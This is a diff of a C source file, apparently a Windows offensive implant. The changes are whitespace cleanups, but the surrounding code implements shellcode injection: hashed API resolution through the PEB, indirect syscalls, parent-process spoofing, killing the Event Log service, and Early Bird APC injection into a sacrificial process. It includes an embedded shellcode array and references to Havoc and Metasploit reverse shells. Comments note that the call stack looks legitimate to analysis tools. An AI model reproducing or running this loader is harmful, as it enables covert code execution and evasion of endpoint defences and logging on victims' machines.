@@ -90,7 +90,7 @@ PWSTR LPSTR_to_PWSTR(LPSTR pFuncName)
 		printf("Error in MultiByteToWideChar\n");
 		return FALSE;
 	}
-	
+
 	// Allocate memory for the PWSTR string
 	PWSTR wideString = (PWSTR)malloc(bufferSize * sizeof(WCHAR));
 	if (wideString == NULL)
@@ -132,10 +132,10 @@ LPVOID ResolveNtAPI(HMODULE DllBase, DWORD64 passedHash)
 	// Getting the Size of ntdll
 	//SIZE_T ntdllsize = NT_HEADER->OptionalHeader.SizeOfImage;
 
-	// Loading loaded DllBase Address from: 
-	// 
+	// Loading loaded DllBase Address from:
+	//
 	// Method2:
-	// 
+	//
 	// Optional Header (IMAGE_OPTIONAL_HEADER64 struture) -> present in winnt.h file
 
 	/*
@@ -160,14 +160,14 @@ LPVOID ResolveNtAPI(HMODULE DllBase, DWORD64 passedHash)
 	//IMAGE_DATA_DIRECTORY* DataDirectory = (IMAGE_DATA_DIRECTORY*)((LPBYTE)DllBase + NT_HEADER->OptionalHeader.DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES].VirtualAddress);
 
 	//DWORD*	AddressOfFunctions = (DWORD*)((LPBYTE)DllBase + DataDirectory->)
-	//DWORD*	AddressOfNames = 
-	//DWORD*	AddressOfNameOrdinals = 
+	//DWORD*	AddressOfNames =
+	//DWORD*	AddressOfNameOrdinals =
 
 	PIMAGE_EXPORT_DIRECTORY EXdir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)DllBase + NT_HEADER->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 	PDWORD fAddr = (PDWORD)((LPBYTE)DllBase + EXdir->AddressOfFunctions);
 	PDWORD fNames = (PDWORD)((LPBYTE)DllBase + EXdir->AddressOfNames);
 	PWORD  fOrdinals = (PWORD)((LPBYTE)DllBase + EXdir->AddressOfNameOrdinals);
-	
+
 	//printf("\tfAddr: %p\n", fAddr);
 	//printf("\tfNames: %p\n", fNames);
 	//printf("\tfOrdinals: %p\n", fOrdinals);
@@ -176,9 +176,9 @@ LPVOID ResolveNtAPI(HMODULE DllBase, DWORD64 passedHash)
 	for (DWORD i = 0; i < EXdir->AddressOfFunctions; i++)
 	{
 		LPSTR pFuncName = (LPSTR)((LPBYTE)DllBase + fNames[i]);
-		
+
 		//PWSTR pwFuncName = LPSTR_to_PWSTR(pFuncName);
-		
+
 		//DWORD64 hash = create_hash(pwFuncName);
 		DWORD64 hash = djb2(pFuncName);
 
@@ -206,7 +206,7 @@ HMODULE ResolveDLL(DWORD64 passedHash)
 	// __readgsqword :
 	// It is MSVC compiler intrinsic that reads memory from GS segment at specified offset.
 
-	
+
 	// Method1:
 
 
@@ -241,7 +241,7 @@ HMODULE ResolveDLL(DWORD64 passedHash)
 
 	// ========================== Directly via offset (from TIB) -> PEB ==============================================
 
-	
+
 	// Method2:
 
 
@@ -278,9 +278,9 @@ HMODULE ResolveDLL(DWORD64 passedHash)
 		LdrEntry = CONTAINING_RECORD(ListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 
 		// Loading loaded DllBase Address from:
-		// 
+		//
 		// Method1:
-		// 
+		//
 		// Loader Data Table Entry (LDR_DATA_TABLE_ENTRY struture) -> present in ntapi.h file
 
 		//UNICODE_STRING FullDllName = (UNICODE_STRING)(LdrEntry->FullDllName);
@@ -319,7 +319,7 @@ HMODULE ResolveDLL(DWORD64 passedHash)
 
 		printf("retrievedhash: 0x%llX\n", retrievedhash);
 		printf("BaseDllName: %ws (addr: %p)\n\n", BaseDllName.Buffer, DllBase);
-		
+
 		if (retrievedhash == passedHash)
 		{
 			printf("Hashed dll matched and calculated as: 0x%llX\n\n", retrievedhash);
@@ -341,9 +341,9 @@ HMODULE ResolveDLL(DWORD64 passedHash)
 // NtOpenProcess: 0x718CCA1F5291F6E7
 // NtAllocateVirtualMemory: 0xF5BD373480A6B89B
 // NtWriteVirtualMemory: 0x68A3C2BA486F0741
-// memcpy: 
+// memcpy:
 // NtProtectVirtualMemory: 0x858BCB1046FB6A37
-// NtDelayExecution: 
+// NtDelayExecution:
 // NtQueueApcThread: 0x7073ED9F921A0267
 
 int main(int argc, char** argv)
@@ -356,7 +356,7 @@ int main(int argc, char** argv)
 		printf("[!] Wrong!\n");
 		printf("[->] Syntax: .\\%s <PPID to spoof>\n\n", argv[0]);
 		return 1;
-	}	
+	}
 
 	// PPID to Spoof
 	char* p;
@@ -366,7 +366,7 @@ int main(int argc, char** argv)
 	// Kill Event Log Service If Elevated
 	BOOL FLAG = IfElevated();
 	if (FLAG == FALSE)
-	{	
+	{
 		// We shouldn't Restart the EventLog
 		flag = FLAG;
 	}
@@ -376,7 +376,7 @@ int main(int argc, char** argv)
 //#include "calc_enc.h"
 
 	PVOID BaseAddress = NULL;
-	
+
 	// Define the shellcode to be injected
 	unsigned char enc_shellcode_bin[] = "\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x48\xBA\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8D\x8D\x01\x01\x00\x00\x41\xBA\x31\x8B\x6F\x87\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5\x63\x61\x6C\x63\x00";
 
@@ -388,9 +388,9 @@ int main(int argc, char** argv)
 	// SIZE_T shellcode variable for NT api operation
 	SIZE_T shellcode_size2 = sizeof(enc_shellcode_bin);
 	ULONG shcSize = (ULONG)shellcode_size;
-	
+
 	//DWORD DWORDshellcode_size2 = sizeof(enc_shellcode_bin); For encrypted shellcode
-	
+
 	// ============================ Havoc and msf revshell ===============================================
 	/*
 	unsigned int shellcode_size = sizeof(enc_shellcode_bin);
@@ -403,7 +403,7 @@ int main(int argc, char** argv)
 
 	WORD syscallNum = NULL;
 	INT_PTR syscallAddress = NULL;
-	
+
 	/* Target Spawned Remote Sacrificial Process: Early Bird APC PInjection : Thanks to reenz0h(twitter : @SEKTOR7net) */
 
 	// Intializing some important stuff
@@ -486,7 +486,7 @@ int main(int argc, char** argv)
 		return 1;
 	}
 
-	*/	
+	*/
 
 	// Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
 	SIZE_T size = 0;
@@ -495,13 +495,13 @@ int main(int argc, char** argv)
 	// Allocate memory for PROC_THREAD_ATTRIBUTE_LIST
 	sie.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
 
-	// Initialise our list 
+	// Initialise our list
 	InitializeProcThreadAttributeList(sie.lpAttributeList, 2, 0, &size);
 
 	// Assign PPID Spoof attribute
 	UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProc, sizeof(HANDLE), NULL, NULL);
 
-	// Setting our new process with 2 Mitigation Policies: BlockDLL (CIG) + ACG(Arbitary Control Guard) 
+	// Setting our new process with 2 Mitigation Policies: BlockDLL (CIG) + ACG(Arbitary Control Guard)
 	UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(HANDLE), NULL, NULL);
 
 	// Obfuscated Winapi:
@@ -541,7 +541,7 @@ int main(int argc, char** argv)
 	// Resolve API address:
 	//LPVOID pNtAlloc = ResolveNtAPI(hDLL, 2375);
 	LPVOID pNtAlloc = ResolveNtAPI(hDLL, 0xF5BD373480A6B89B);
-	
+
 	syscallNum = SortSSN(pNtAlloc);
 	syscallAddress = GetsyscallInstr(pNtAlloc);
 
@@ -610,7 +610,7 @@ int main(int argc, char** argv)
 
 
 	// ================ NtWriteVirtualMemory() =================================
-	
+
 	//LPVOID pNtWrite = GetProcAddress(hDLL, (LPCSTR)NtWrite);
 
 	// Resolve API address:
@@ -637,7 +637,7 @@ int main(int argc, char** argv)
 	{
 		printf("\t=> Called sysNtWriteVirtualMemory\n");
 	}
-	
+
 	// ================ End: NtWriteVirtualMemory() =================================
 
 	// ========================= NtProtectVirtualMemory() =============================
@@ -674,15 +674,15 @@ int main(int argc, char** argv)
 
 	// ========================= For Debugging ==============================================
 
-	// Just Uncomment this and compile -> Execute and open the implant process in process hacker -> check thread Stack -> It's totally Legit 
-	// 
-	// 1. Top of the stack will indeed show ntoskrnl.exe as 
+	// Just Uncomment this and compile -> Execute and open the implant process in process hacker -> check thread Stack -> It's totally Legit
+	//
+	// 1. Top of the stack will indeed show ntoskrnl.exe as
 	// => ProcessHacker has a Driver inbuilt which will see beyond the call to ntdll and into ntoskrnl (kernel)
-	// 
-	// 2. Compared with legit cmd process, stack looks identical 
+	//
+	// 2. Compared with legit cmd process, stack looks identical
 	//		i. => Nt functions are present at the top of the Stack (Leaving, the "ntoskrnl.exe is on TOP of CallStack" factor)
-	// 
-	//		ii. => Nt functions are retrieved from ntdll itself, NOT from implant process 
+	//
+	//		ii. => Nt functions are retrieved from ntdll itself, NOT from implant process
 	/*
 	LARGE_INTEGER SleepUntil;
 	//LARGE_INTEGER SleepTo;
@@ -761,7 +761,7 @@ int main(int argc, char** argv)
 	GetSyscallAddr(syscallAddress);
 
 	NTSTATUS NTWFSOstatus = sysNtWaitForSingleObject(hThread, FALSE, &Timeout);
-	
+
 	if (!NT_SUCCESS(NTWFSOstatus))
 	{
 		printf("[!] Failed in NtWaitForSingleObject (%u)\n", GetLastError());
@@ -785,7 +785,7 @@ int main(int argc, char** argv)
 	LPVOID pNtQueueApcThread = ResolveNtAPI(hDLL, 0x7073ED9F921A0267);
 
 	syscallNum = SortSSN(pNtQueueApcThread);
-	
+
 	//printf("[+] Sorted SSN: %d", syscallNum);
 
 	syscallAddress = GetsyscallInstr(pNtQueueApcThread);
@@ -793,7 +793,7 @@ int main(int argc, char** argv)
 	// Indirect Syscall
 	GetSyscall(syscallNum);
 	GetSyscallAddr(syscallAddress);
-	
+
 	NtQueueApcThread = &sysNtQueueApcThread;
 
 	LPVOID pAlloc = BaseAddress;
@@ -823,7 +823,7 @@ int main(int argc, char** argv)
 
 	//CloseHandle(hProcess);
 	//CloseHandle(hThread);
-	
+
 	/*
 	// If EventLog Intially ran Before execution of our Implant
 	if (flag == TRUE)
@@ -835,7 +835,7 @@ int main(int argc, char** argv)
 			return 1;
 		}
 	}
-	
+
 	//printf("flag: %s", flag ? "TRUE" : "FALSE");
 	*/
 
